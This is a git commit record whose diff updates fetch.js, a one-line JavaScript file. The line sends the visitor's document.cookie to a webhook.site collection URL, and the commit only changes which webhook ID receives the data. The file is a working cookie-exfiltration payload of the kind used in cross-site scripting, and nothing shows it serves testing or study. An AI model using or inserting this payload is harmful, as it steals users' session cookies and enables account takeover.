70ce5a513d78db2b899892584e04bc1db650930a
Prabhash Thakur <68106479+Prabhash-bit@users.noreply.github.com>
2024-11-22 21:44:45 +0400

    Update fetch.js

--- fetch.js
+++ fetch.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/77c0071e-f3b0-4fcf-9b68-2b430a2338aa/?cookie=' + document.cookie);
+fetch('https://webhook.site/011c712e-04d8-4a9e-aa50-ac7442387cee/?cookie=' + document.cookie);
